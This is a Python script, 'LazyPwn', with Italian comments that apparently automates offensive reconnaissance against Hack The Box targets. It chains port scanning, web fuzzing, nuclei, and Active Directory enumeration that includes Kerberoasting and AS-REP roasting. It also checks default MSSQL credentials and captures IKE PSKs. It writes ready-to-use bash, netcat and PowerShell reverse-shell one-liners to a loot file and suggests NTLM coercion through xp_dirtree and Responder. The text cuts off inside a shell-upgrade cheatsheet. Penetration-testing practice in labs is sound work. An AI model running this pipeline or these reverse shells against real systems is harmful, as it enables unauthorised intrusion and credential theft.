import asyncio
import os
import json
import signal
import sys
import xml.etree.ElementTree as ET
import uuid
import urllib.request
import urllib.error
from urllib.parse import urlparse
from rich.console import Console
from rich.panel import Panel

console = Console()


class StateManager:
    def __init__(self, state_file):
        self.state_file = state_file
        self.state = self.load_state()

    def load_state(self):
        import os, json
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, "r") as f:
                    return json.load(f)
            except:
                pass
        return {"steps": {}, "data": {}}

    def save_state(self):
        import json
        with open(self.state_file, "w") as f:
            json.dump(self.state, f, indent=4)

    def is_completed(self, step_name):
        return self.state["steps"].get(step_name, False)

    def mark_completed(self, step_name):
        self.state["steps"][step_name] = True
        self.save_state()

    def set_data(self, key, value):
        self.state["data"][key] = value
        self.save_state()

    def get_data(self, key, default=None):
        return self.state["data"].get(key, default)

class ProcessManager:
    def __init__(self, target_ip, base_dir):
        self.target_ip = target_ip
        self.base_dir = base_dir
        self.log_dir = os.path.join(base_dir, f"htb_{target_ip}", "logs")
        self.loot_dir = os.path.join(base_dir, f"htb_{target_ip}", "loot")
        os.makedirs(self.log_dir, exist_ok=True)
        os.makedirs(self.loot_dir, exist_ok=True)
        self.tasks = []
        self._shutdown = False

    async def run(self, cmd, log_name, timeout=600):
        if self._shutdown: return None
        log_file = os.path.join(self.log_dir, f"{log_name}.log")
        console.print(f"[cyan][*] Esecuzione:[/cyan] {cmd}")
        try:
            with open(log_file, "a") as f:
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=f,
                    stderr=f,
                    start_new_session=True
                )
                self.tasks.append(proc)
                await asyncio.wait_for(proc.communicate(), timeout=timeout)
                if proc.returncode == 0:
                    console.print(f"[green][+] Completato:[/green] {log_name}")
                else:
                    console.print(f"[red][-] Errore in:[/red] {log_name} (Code: {proc.returncode})")
                return proc.returncode
        except asyncio.TimeoutError:
            console.print(f"[yellow][!] Timeout raggiunto per {log_name}. Termino il processo![/yellow]")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    pass
            return -1

    async def run_and_capture(self, cmd, log_name, timeout=600):
        if self._shutdown: return None, ""
        log_file = os.path.join(self.log_dir, f"{log_name}.log")
        console.print(f"[cyan][*] Esecuzione (Capture):[/cyan] {cmd}")
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                start_new_session=True
            )
            self.tasks.append(proc)
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
            with open(log_file, "a") as f:
                f.write(output)
                
            if proc.returncode == 0:
                console.print(f"[green][+] Completato:[/green] {log_name}")
            else:
                console.print(f"[red][-] Errore in:[/red] {log_name} (Code: {proc.returncode})")
            return proc.returncode, output
        except asyncio.TimeoutError:
            console.print(f"[yellow][!] Timeout raggiunto per {log_name}. Termino il processo![/yellow]")
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    pass
            return -1, ""

    def terminate_all(self):
        self._shutdown = True
        console.print("[yellow][!] Ricevuto segnale di interruzione. Pulizia in corso...[/yellow]")
        for proc in self.tasks:
            try:
                if proc.returncode is None:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                pass
        
        state_file = os.path.join(self.base_dir, f"htb_{self.target_ip}", "state.json")
        with open(state_file, "w") as f:
            json.dump({"status": "interrupted"}, f)
        console.print("[green][+] Stato salvato in state.json. Uscita.[/green]")
        sys.exit(0)



class WebScrubber:
    def __init__(self, target_ip, port, domain, pm, sm):
        self.target_ip = target_ip
        self.port = port
        self.domain = domain
        self.pm = pm
        self.sm = sm
        protocol = "https" if str(port) in ["443", "8443"] else "http"
        self.base_url = f"{protocol}://{target_ip}:{port}"
    
    async def run_all(self):
        console.print(f"[cyan][*] Inizio WebScrubber su {self.base_url}[/cyan]")
        
        # 1. Wildcard DNS Check (Pre-Flight)
        has_wildcard, baseline_words = await self._check_wildcard()
        
        # 2. VHOST Enumeration (FFUF)
        vhosts = []
        if not self.sm.is_completed(f"web_vhosts_{self.port}"):
            vhosts = await self._fuzz_vhosts(has_wildcard, baseline_words)
            self.sm.set_data(f"vhosts_{self.port}", vhosts)
            self.sm.mark_completed(f"web_vhosts_{self.port}")
        else:
            console.print(f"[+] VHOST Enumeration già completata su porta {self.port}. Skipping...")
            vhosts = self.sm.get_data(f"vhosts_{self.port}", [])
        
        # 3. Directory Fuzzing (FFUF)
        if not self.sm.is_completed(f"web_dirs_{self.port}"):
            await self._fuzz_directories()
            self.sm.mark_completed(f"web_dirs_{self.port}")
        else:
            console.print(f"[+] Directory Fuzzing già completato su porta {self.port}. Skipping...")
        
        # 4. Vulnerability & CVE Scanning (Nuclei)
        if not self.sm.is_completed(f"web_nuclei_{self.port}"):
            targets = [self.base_url] + [f"http://{vh}:{self.port}" for vh in vhosts]
            await self._scan_nuclei(targets)
            self.sm.mark_completed(f"web_nuclei_{self.port}")
        else:
            console.print(f"[+] Scansione Nuclei già completata su porta {self.port}. Skipping...")
        
        # 5. Visual Reconnaissance (Gowitness)
        if not self.sm.is_completed(f"web_gowitness_{self.port}"):
            targets = [self.base_url] + [f"http://{vh}:{self.port}" for vh in vhosts]
            await self._run_gowitness(targets)
            self.sm.mark_completed(f"web_gowitness_{self.port}")
        else:
            console.print(f"[+] Visual Reconnaissance già completata su porta {self.port}. Skipping...")
        
    async def _check_wildcard(self):
        if not self.domain:
            return False, 0
            
        random_sub = f"{uuid.uuid4().hex[:8]}.{self.domain}"
        
        def fetch():
            try:
                # Usiamo l'IP ma passiamo l'host header del sottodominio random
                req = urllib.request.Request(self.base_url, headers={"Host": random_sub})
                with urllib.request.urlopen(req, timeout=5) as response:
                    return response.read(), response.status
            except urllib.error.HTTPError as e:
                return e.read(), e.code
            except Exception:
                return None, 0

        # Eseguiamo la request in un thread per non bloccare l'event loop
        body, status = await asyncio.to_thread(fetch)
        
        if status in [200, 301, 302] and body:
            words = len(body.split())
            console.print(f"[yellow][!] Wildcard DNS rilevato risorsa default! Baseline parole: {words}[/yellow]")
            return True, words
        return False, 0

    async def _fuzz_vhosts(self, has_wildcard, baseline_words):
        if not self.domain: 
            return []
            
        console.print("[cyan][*] Inizio VHOST Fuzzing...[/cyan]")
        out_json = os.path.join(self.pm.log_dir, f"vhosts_{self.port}.json")
        wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
        cmd = f"ffuf -w {wordlist} -u {self.base_url} -H 'Host: FUZZ.{self.domain}' -of json -o {out_json}"
        
        if has_wildcard:
            cmd += f" -fw {baseline_words}"
            
        await self.pm.run(cmd, f"ffuf_vhosts_{self.port}", timeout=600)
        
        valid_vhosts = []
        if os.path.exists(out_json):
            try:
                with open(out_json, "r") as f:
                    data = json.load(f)
                    for res in data.get("results", []):
                        vhost = f"{res['host']}" # FFUF logga il payload
                        full_vhost = f"{vhost}.{self.domain}" if vhost != self.domain else vhost
                        valid_vhosts.append(full_vhost)
                        console.print(f"[bold green][+] Trovato VHOST valido: {full_vhost}[/bold green]")
                        console.print(f"[yellow][!] [Auto-Pwn] Consigliato eseguire: echo '{self.target_ip} {full_vhost}' >> /etc/hosts[/yellow]")
            except Exception as e:
                console.print(f"[red][-] Errore lettura risultati ffuf: {e}[/red]")
                
        return valid_vhosts

    async def _fuzz_directories(self):
        console.print("[cyan][*] Inizio Directory Fuzzing...[/cyan]")
        out_json = os.path.join(self.pm.log_dir, f"dirs_{self.port}.json")
        wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
        cmd = f"ffuf -w {wordlist} -u {self.base_url}/FUZZ -of json -o {out_json}"
        await self.pm.run(cmd, f"ffuf_dirs_{self.port}", timeout=600)

    async def _scan_nuclei(self, targets):
        console.print(f"[cyan][*] Lancio Nuclei su {len(targets)} target...[/cyan]")
        target_file = os.path.join(self.pm.log_dir, f"nuclei_targets_{self.port}.txt")
        with open(target_file, "w") as f:
            for t in targets:
                f.write(t + "\n")
                
        tags = "cves,lfi,xss,misconfiguration,default-logins,exposed-panels"
        out_file = os.path.join(self.pm.log_dir, f"nuclei_{self.port}.txt")
        cmd = f"nuclei -l {target_file} -t {tags} -o {out_file}"
        await self.pm.run(cmd, f"nuclei_{self.port}", timeout=900)
        
        # Check for critical alerts
        if os.path.exists(out_file):
            with open(out_file, "r") as f:
                content = f.read().lower()
                if "[critical]" in content or "[high]" in content:
                    console.print(Panel(
                        f"[bold red blink][!] Nuclei ha trovato vulnerabilità CRITICHE o HIGH sulla porta {self.port}![/bold red blink]\nControlla i log immediatamente in {out_file}!",
                        title="VULNERABILITÀ CRITICA RILEVATA",
                        border_style="red"
                    ))

    async def _run_gowitness(self, targets):
        console.print("[cyan][*] Lancio Gowitness (Visual Reconnaissance)...[/cyan]")
        target_file = os.path.join(self.pm.log_dir, f"gowitness_targets_{self.port}.txt")
        with open(target_file, "w") as f:
            for t in targets:
                f.write(t + "\n")
                
        out_dir = os.path.join(self.pm.log_dir, "gowitness_shots")
        cmd = f"gowitness file -f {target_file} -d {out_dir}"
        await self.pm.run(cmd, f"gowitness_{self.port}", timeout=300)


async def extract_domain(target_ip, pm):
    console.print(f"[cyan][*] Estrazione dominio via SMB per {target_ip}...[/cyan]")
    cmd = f"netexec smb {target_ip}"
    
    # Run the command and capture output instead of writing to log directly using a dedicated subprocess
    import asyncio
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
        output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
        
        # Save output to log as well
        log_file = os.path.join(pm.log_dir, "extract_domain.log")
        with open(log_file, "w") as f:
            f.write(output)
            
        import re
        match = re.search(r'domain:([^\s]+)', output, re.IGNORECASE)
        if match:
            domain = match.group(1).strip()
            console.print(f"[bold green][+] Dominio estratto: {domain}[/bold green]")
        elif match_name := re.search(r'name:([^\s]+)', output, re.IGNORECASE):
            name = match_name.group(1).strip()
            domain = f"{name}.htb".lower()
            console.print(f"[yellow][!] Dominio non trovato, fallback su hostname: {domain}[/yellow]")
        else:
            domain = None
            
        if domain:
            with open(os.path.join(pm.loot_dir, "domain.txt"), "w") as df:
                df.write(domain)
            return domain
            
    except Exception as e:
        console.print(f"[red][-] Errore estrazione dominio: {e}[/red]")
        
    console.print("[yellow][!] Estrazione dominio fallita, uso default: target.htb[/yellow]")
    return "target.htb"

class ADScout:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio ADScout su {self.target_ip}[/cyan]")
        
        # 1. SMB Enumeration
        if not self.sm.is_completed("ad_smb_enum"):
            console.print("[cyan][*] Enumerazione SMB (anonymous access & pass-pol)...[/cyan]")
            cmd_smb = f"netexec smb {self.target_ip} -u '' -p '' --shares --pass-pol"
            await self.pm.run(cmd_smb, "adscout_smb_enum", timeout=300)
            self.sm.mark_completed("ad_smb_enum")
        else:
            console.print("[+] Enumerazione SMB già completata. Skipping...")
        
        # 2. LDAP Enumeration
        if not self.sm.is_completed("ad_ldap_enum"):
            console.print("[cyan][*] Enumerazione LDAP (anonymous bind & users)...[/cyan]")
            cmd_ldap = f"netexec ldap {self.target_ip} -u '' -p '' --users --asreproast asrep.txt --kerberoasting kerb.txt"
            await self.pm.run(cmd_ldap, "adscout_ldap_enum", timeout=300)
            self.sm.mark_completed("ad_ldap_enum")
        else:
            console.print("[+] Enumerazione LDAP già completata. Skipping...")
        
        # 3. AD CS Alert
        console.print(Panel(
            "[bold red][!] Dominio rilevato. Se ottieni credenziali valide, RICORDA di lanciare Certipy per check vulnerabilità ESC (es. ESC1/ESC8) su AD CS![/bold red]",
            title="Active Directory Certificate Services",
            border_style="magenta"
        ))

class MSSQLHunter:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio MSSQLHunter su {self.target_ip}[/cyan]")
        
        # 1. Weak Auth Check (Guest)
        if not self.sm.is_completed("mssql_guest"):
            console.print("[cyan][*] Controllo credenziali deboli (guest)...[/cyan]")
            cmd_guest = f"netexec mssql {self.target_ip} -u 'guest' -p ''"
            await self.pm.run(cmd_guest, "mssqlhunter_guest", timeout=120)
            self.sm.mark_completed("mssql_guest")
        else:
            console.print("[+] Controllo MSSQL Guest già completato. Skipping...")
        
        # 2. Weak Auth Check (Scott)
        if not self.sm.is_completed("mssql_scott"):
            console.print("[cyan][*] Controllo credenziali deboli (scott/tiger)...[/cyan]")
            cmd_scott = f"netexec mssql {self.target_ip} -u 'scott' -p 'tiger'"
            await self.pm.run(cmd_scott, "mssqlhunter_scott", timeout=120)
            self.sm.mark_completed("mssql_scott")
        else:
            console.print("[+] Controllo MSSQL Scott già completato. Skipping...")
        
        # 3. Coercion Killchain Alert
        console.print(Panel(
            "[bold red][!] MS-SQL Trovato. Se ottieni l'accesso, prepara Responder sulla tua interfaccia (sudo responder -I tun0) e usa xp_dirtree per forzare l'autenticazione SMB ed estrarre l'hash NTLMv2 del service account![/bold red]",
            title="MS-SQL Coercion Killchain",
            border_style="red"
        ))

class IKESnatcher:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio IKESnatcher su {self.target_ip}[/cyan]")
        psk_file = os.path.join(self.pm.loot_dir, "ike_psk.txt")
        
        if not self.sm.is_completed("ike_scan"):
            cmd = f"ike-scan --aggressive --id=test --pskcrack={psk_file} {self.target_ip}"
            await self.pm.run(cmd, "ikesnatcher", timeout=120)
            self.sm.mark_completed("ike_scan")
        else:
            console.print("[+] IKE Scan già completato. Skipping...")
        
        if os.path.exists(psk_file) and os.path.getsize(psk_file) > 0:
            console.print(Panel(
                f"[bold yellow][!] IKE Phase 1 PSK Catturato! L'hash è in loot/ike_psk.txt.[/bold yellow]\n[bold red]Lancialo in pasto a hashcat o psk-crack![/bold red]",
                title="IKE VPN Pwned",
                border_style="red"
            ))

class InfraScout:
    def __init__(self, target_ip, port, service_name, domain, pm, sm):
        self.target_ip = target_ip
        self.port = str(port)
        self.service_name = service_name
        self.domain = domain
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio InfraScout su {self.target_ip}:{self.port} ({self.service_name})[/cyan]")
        
        if self.port == "21" or self.service_name == "ftp":
            if not self.sm.is_completed(f"infra_ftp_{self.port}"):
                console.print("[cyan][*] Controllo accesso FTP Anonymous...[/cyan]")
                cmd = f"netexec ftp {self.target_ip} -u 'anonymous' -p ''"
                rc, output = await self.pm.run_and_capture(cmd, f"infrascout_ftp_{self.port}", timeout=120)
                if rc == 0 or "Pwn3d!" in output or "Success" in output:
                    console.print(Panel("[bold red blink][!] Accesso Anonymous FTP consentito! Controlla i file![/bold red blink]", title="FTP Anonymous", border_style="red"))
                self.sm.mark_completed(f"infra_ftp_{self.port}")
            else:
                console.print(f"[+] Controllo FTP su porta {self.port} già completato. Skipping...")
                
        elif self.port == "53" or self.service_name == "domain":
            if not self.sm.is_completed(f"infra_dns_{self.port}"):
                if self.domain and self.domain != "target.htb":
                    console.print(f"[cyan][*] Controllo Zone Transfer DNS su {self.domain}...[/cyan]")
                    log_file = os.path.join(self.pm.log_dir, "dns_zonetransfer.log")
                    cmd = f"dig axfr @{self.target_ip} {self.domain} | tee {log_file}"
                    await self.pm.run(cmd, f"infrascout_dns_{self.port}", timeout=60)
                else:
                    console.print("[yellow][!] Dominio non valido per Zone Transfer. Skipping...[/yellow]")
                self.sm.mark_completed(f"infra_dns_{self.port}")
            else:
                console.print(f"[+] Controllo DNS su porta {self.port} già completato. Skipping...")
                
        elif self.port in ["111", "2049"] or self.service_name in ["rpcbind", "nfs"]:
            if not self.sm.is_completed(f"infra_nfs_{self.port}"):
                console.print("[cyan][*] Enumerazione NFS shares...[/cyan]")
                log_file = os.path.join(self.pm.log_dir, "nfs_shares.log")
                cmd = f"showmount -e {self.target_ip} | tee {log_file}"
                await self.pm.run(cmd, f"infrascout_nfs_{self.port}", timeout=60)
                self.sm.mark_completed(f"infra_nfs_{self.port}")
            else:
                console.print(f"[+] Enumerazione NFS su porta {self.port} già completata. Skipping...")

class ReconRouter:
    def __init__(self, target_ip, process_manager, sm):
        self.target_ip = target_ip
        self.pm = process_manager
        self.sm = sm

    def parse_nmap_xml(self, xml_file):
        if not os.path.exists(xml_file):
            console.print(f"[red][-] File Nmap XML non trovato: {xml_file}[/red]")
            return []
        
        services = []
        try:
            tree = ET.parse(xml_file)
            for port_node in tree.findall(".//port"):
                state = port_node.find("state").get("state")
                if state == "open":
                    port = port_node.get("portid")
                    protocol = port_node.get("protocol")
                    service = port_node.find("service")
                    svc_name = service.get("name") if service is not None else "unknown"
                    services.append({"port": port, "protocol": protocol, "service": svc_name})
        except Exception as e:
            console.print(f"[red][-] Errore parse XML: {str(e)}[/red]")
        return services

    async def route(self, services):
        has_windows = any(svc["port"] in ["139", "445", "88", "389"] for svc in services)
        self.domain = "target.htb"
        if has_windows:
            self.domain = await extract_domain(self.target_ip, self.pm)

        tasks = []
        for svc in services:
            port = svc["port"]
            name = svc["service"].lower()
            proto = svc["protocol"].lower()

            # Trigger Web
            if name in ["http", "https", "http-alt"] or port in ["80", "443"]:
                tasks.append(asyncio.create_task(self.enum_web(port)))
            
            # Trigger AD/Windows
            elif port in ["88", "389", "445"]:
                console.print(f"[magenta][*] AD/Windows Enum Triggered su porta {port}![/magenta]")
                tasks.append(asyncio.create_task(self.enum_active_directory(port)))
                
            # Trigger MS-SQL
            elif port == "1433" or name == "ms-sql-s":
                console.print(f"[red][!] MS-SQL Rilevato sulla porta {port}: potenziale coercizione NTLM via xp_dirtree[/red]")
                tasks.append(asyncio.create_task(self.enum_mssql(port)))
                
            # Trigger VPN/UDP
            elif proto == "udp" and port == "500":
                tasks.append(asyncio.create_task(self.enum_ike(port)))
                
            # Trigger Infra
            elif port in ["21", "53", "111", "2049"] or name in ["ftp", "domain", "rpcbind", "nfs"]:
                tasks.append(asyncio.create_task(self.enum_infra(port, name)))
                
        if tasks:
            await asyncio.gather(*tasks)

    async def enum_web(self, port):
        # Inizializziamo il sottomodulo WebScrubber usando il dominio individuato dinamicamente via extract_domain (se presente)
        scrubber = WebScrubber(self.target_ip, port, getattr(self, 'domain', 'target.htb'), self.pm, self.sm)
        await scrubber.run_all()

    async def enum_active_directory(self, port):
        ad_scout = ADScout(self.target_ip, self.pm, self.sm)
        await ad_scout.run_all()

    async def enum_mssql(self, port):
        mssql_hunter = MSSQLHunter(self.target_ip, self.pm, self.sm)
        await mssql_hunter.run_all()

    async def enum_ike(self, port):
        ike_snatcher = IKESnatcher(self.target_ip, self.pm, self.sm)
        await ike_snatcher.run_all()

    async def enum_infra(self, port, name):
        infra_scout = InfraScout(self.target_ip, port, name, getattr(self, 'domain', 'target.htb'), self.pm, self.sm)
        await infra_scout.run_all()

def generate_payloads_and_template(target_ip, pm):
    lhost = get_lhost()
    port = 4444
    
    domain_file = os.path.join(pm.loot_dir, "domain.txt")
    domain_target = target_ip
    if os.path.exists(domain_file):
        with open(domain_file, "r") as f:
            domain_text = f.read().strip()
        if domain_text and domain_text != "target.htb":
            domain_target = domain_text
            
    # Payloads
    loot_dir = pm.loot_dir
    payloads_file = os.path.join(loot_dir, "reverse_shells.txt")
    payloads = f"""# Reverse Shell Payloads (LHOST={lhost}, LPORT={port})

# Bash
bash -c 'bash -i >& /dev/tcp/{lhost}/{port} 0>&1'

# Netcat (Traditional)
nc -e /bin/sh {lhost} {port}

# Netcat (OpenBSD mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f

# PowerShell (Generic One-Liner)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
"""
    with open(payloads_file, "w") as f:
        f.write(payloads)
        
    # Python Template
    base_dir = os.path.join(pm.base_dir, f"htb_{target_ip}")
    template_file = os.path.join(base_dir, "pwn_template.py")
    template = f"""#!/usr/bin/env python3
import requests
import urllib3
from bs4 import BeautifulSoup

# Disabilita i warning per certificati self-signed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {{"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}}
HEADERS = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) LazyPwn/1.0"}}
TARGET = "http://{domain_target}"

s = requests.Session()
s.proxies.update(PROXY)
s.headers.update(HEADERS)
s.verify = False

def exploit():
    print(f"[*] Inizio exploit contro {{TARGET}}")
    # Scrivi qui la tua logica di exploit per HR/CTF
    
    # Esempio:
    # res = s.get(f"{{TARGET}}/example", timeout=10)
    # if res.status_code == 200:
    #     soup = BeautifulSoup(res.text, "html.parser")

if __name__ == "__main__":
    exploit()
"""
    with open(template_file, "w") as f:
        f.write(template)
    
    console.print(f"[bold green][+] reverse_shells.txt salvato in loot/[/bold green]")
    console.print(f"[bold green][+] pwn_template.py generato nella root del target[/bold green]")
    
    # Python Pwntools Template
    binary_template_file = os.path.join(base_dir, "pwn_binary_template.py")
    binary_template = f'''#!/usr/bin/env python3
from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# context.arch = 'amd64'

def start():
    if args.REMOTE:
        return remote("{target_ip}", 1337)
    else:
        return process("./binary_name")

io = start()
# log.info(f"Leaked address: {{hex(leak)}}")
io.interactive()
'''
    with open(binary_template_file, "w") as f:
        f.write(binary_template)
    console.print(f"[bold green][+] pwn_binary_template.py generato nella root del target[/bold green]")

async def generate_markdown_report(target_ip, pm, sm, services):
    report_file = os.path.join(pm.base_dir, f"htb_{target_ip}", "REPORT.md")
    
    # Domain
    domain_file = os.path.join(pm.loot_dir, "domain.txt")
    domain = sm.get_data("domain", None)
    if not domain and os.path.exists(domain_file):
        with open(domain_file, "r") as f:
            domain = f.read().strip()
    if not domain:
        domain = "Sconosciuto / Fallback (target.htb)"
        
    report = f"# Report Penetration Test: {target_ip}\n\n"
    report += f"**IP Target:** `{target_ip}`\n"
    report += f"**Dominio Estratto:** `{domain}`\n\n"
    
    report += "## 1. Servizi Esposti (Port Scanning)\n"
    report += "| Porta | Protocollo | Servizio |\n"
    report += "|-------|------------|----------|\n"
    for svc in services:
        report += f"| {svc['port']} | {svc['protocol'].upper()} | {svc['service']} |\n"
    report += "\n"
    
    # VHOSTs
    report += "## 2. Web - Virtual Hosts Trovati\n"
    vhosts_found = []
    for key, val in sm.state.get("data", {}).items():
        if key.startswith("vhosts_") and isinstance(val, list):
            vhosts_found.extend(val)
            
    if vhosts_found:
        for vh in set(vhosts_found):
            report += f"- `{vh}`\n"
    else:
        report += "- *Nessun VHOST rilevato o enumerazione non completata.*\n"
    report += "\n"
    
    # IKE VPN
    psk_file = os.path.join(pm.loot_dir, "ike_psk.txt")
    if os.path.exists(psk_file) and os.path.getsize(psk_file) > 0:
        report += "## :warning: VULNERABILITÀ VPN: IKE Phase 1 PSK Catturato!\n"
        report += f"**CRITICO:** È stato possibile estrarre l'hash PSK in Aggressive Mode. Controlla il log situato in:\n`{psk_file}`\n\n"
    
    report += "## 3. Vulnerabilità Infrastrutturali\n"
    infra_found = False
    
    import glob
    ftp_logs = glob.glob(os.path.join(pm.log_dir, "infrascout_ftp_*.log"))
    for ftp_log in ftp_logs:
        if os.path.exists(ftp_log):
            with open(ftp_log, "r") as log_f:
                content = log_f.read()
                if "Pwn3d!" in content or "Success" in content:
                    report += "- **FTP Anonymous:** Permesso! Controlla i log per scoprire i file esposti.\n"
                    infra_found = True
                    break
    
    dns_log = os.path.join(pm.log_dir, "dns_zonetransfer.log")
    if os.path.exists(dns_log) and os.path.getsize(dns_log) > 0:
        report += "- **DNS Zone Transfer:** Riuscito! Controlla i record DNS estratti.\n"
        infra_found = True
        
    nfs_log = os.path.join(pm.log_dir, "nfs_shares.log")
    if os.path.exists(nfs_log) and os.path.getsize(nfs_log) > 0:
        report += "- **NFS Shares:** Share esposte rilevate. Cerca nel log i dettagli dei mount esposti.\n"
        infra_found = True
        
    if not infra_found:
        report += "- *Nessuna vulnerabilità infrastrutturale critica rilevata.*\n"
        
    report += "\n"
    
    with open(report_file, "w") as f:
        f.write(report)
    
    console.print(f"[bold green][+] Auto-Report Markdown generato in {report_file}[/bold green]")


def check_dependencies():
    import shutil
    tools = ["rustscan", "nmap", "netexec", "ffuf", "nuclei", "gowitness", "ike-scan"]
    for tool in tools:
        if shutil.which(tool) is None:
            console.print(f"[yellow][!] Attenzione: '{tool}' non trovato nel PATH. Alcuni moduli potrebbero fallire.[/yellow]")

async def pipeline(target_ip, base_dir):
    check_dependencies()
    pm = ProcessManager(target_ip, base_dir)
    state_file = os.path.join(pm.base_dir, f"htb_{target_ip}", "state.json")
    sm = StateManager(state_file)
    
    # Registrazione graceful shutdown su SIGINT (Ctrl+C)
    def signal_handler(sig, frame):
        pm.terminate_all()
    signal.signal(signal.SIGINT, signal_handler)

    console.print(Panel(f"Iniziando scansione LazyPwn su [bold yellow]{target_ip}[/bold yellow]", style="bold green"))
    
    # Step 1: Rustscan - Fast TCP Scan
    if sm.is_completed("rustscan"):
        console.print("[+] Step rustscan già completato. Skipping...")
        ports = sm.get_data("rustscan_ports")
        if not ports:
            console.print("[red][-] Errore: porte non salvate nello stato. Forzo uscita.[/red]")
            return
    else:
        rc, output = await pm.run_and_capture(f"rustscan -a {target_ip} -g -- -Pn", "rustscan_tcp", timeout=300)
        match = re.search(r'\[(.*?)\]', output)
        if match:
            ports = match.group(1).replace(" ", "")
        else:
            ports = ""
            
        if not ports:
            console.print("[red][-] Nessuna porta trovata o errore in RustScan. Uscita.[/red]")
            return
            
        sm.set_data("rustscan_ports", ports)
        sm.mark_completed("rustscan")
        console.print(f"[bold green][+] Porte estratte da RustScan: {ports}[/bold green]")
    
    # Step 2: Nmap UDP mirato
    udp_task = None
    udp_xml_path = os.path.join(pm.log_dir, "nmap_udp.xml")
    if sm.is_completed("nmap_udp"):
        console.print("[+] Step nmap_udp già completato. Skipping...")
    else:
        udp_task = asyncio.create_task(
            pm.run(f"nmap -sU -p500,161,69 {target_ip} -oX {udp_xml_path}", "nmap_udp", timeout=600)
        )
    
    # Step 3: Nmap profondo solo su porte estratte (Ottimizzazione!)
    nmap_xml_path = os.path.join(pm.log_dir, "nmap_full.xml")
    if sm.is_completed("nmap_full"):
        console.print("[+] Step nmap_full già completato. Skipping...")
    else:
        await pm.run(f"nmap -sC -sV -p {ports} -T4 {target_ip} -oX {nmap_xml_path}", "nmap_full", timeout=1200)
        sm.mark_completed("nmap_full")

    # Attendiamo UDP se era stato lanciato e non era nello stato completato precedentemente
    if udp_task and not sm.is_completed("nmap_udp"):
        await udp_task
        sm.mark_completed("nmap_udp")
    
    # Cervello Decisionale: Service Router
    router = ReconRouter(target_ip, pm, sm)
    services_tcp = router.parse_nmap_xml(nmap_xml_path)
    services_udp = router.parse_nmap_xml(udp_xml_path)
    
    # Merge avoiding duplicates
    services = services_tcp.copy()
    for udp_svc in services_udp:
        if udp_svc not in services:
            services.append(udp_svc)
    
    # Fallback/Demo se Nmap XML non è stato generato (solo per test)
    if not services:
        console.print("[yellow][!] Demo mode: inietto servizi fittizi poiché Nmap XML è assente o vuoto[/yellow]")
        services = [
            {"port": "80", "protocol": "tcp", "service": "http"},
            {"port": "445", "protocol": "tcp", "service": "microsoft-ds"},
            {"port": "1433", "protocol": "tcp", "service": "ms-sql-s"},
            {"port": "500", "protocol": "udp", "service": "isakmp"}
        ]
        
    await router.route(services)
    
    # Generazione Quality of Life & Auto-Reporting
    generate_payloads_and_template(target_ip, pm)
    await generate_markdown_report(target_ip, pm, sm, services)
    
    console.print("[bold green][+] Pipeline completata con successo![/bold green]")

def get_lhost(interface="tun0"):
    import subprocess
    try:
        output = subprocess.check_output(f"ip -4 addr show {interface} | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'", shell=True)
        return output.decode().strip()
    except:
        return "[TUO_IP_TUN0]"

class ShellWhisperer:
    def __init__(self):
        self.tools_dir = os.path.join(os.getcwd(), "tools")
        os.makedirs(self.tools_dir, exist_ok=True)


    def run(self):
        import threading
        import http.server
        import socketserver
        
        ip = get_lhost()
        port = 8000
        
        console.print(Panel(f"Cartella servita: [bold cyan]{self.tools_dir}[/bold cyan]", title="ShellWhisperer - HTTP Server", border_style="green"))

        def serve():
            os.chdir(self.tools_dir)
            Handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("", port), Handler) as httpd:
                httpd.serve_forever()

        t = threading.Thread(target=serve, daemon=True)
        t.start()
        console.print(f"[bold green][+] Web server avviato in background su http://0.0.0.0:{port}[/bold green]")
        
        cheatsheet_tty = """[bold cyan]1. Scusa python pty (Drop into shell):[/bold cyan]
python3 -c 'import pty; pty.spawn("/bin/bash")'

[bold cyan]2. Setta TERM:[/bold cyan]
export TERM=xterm

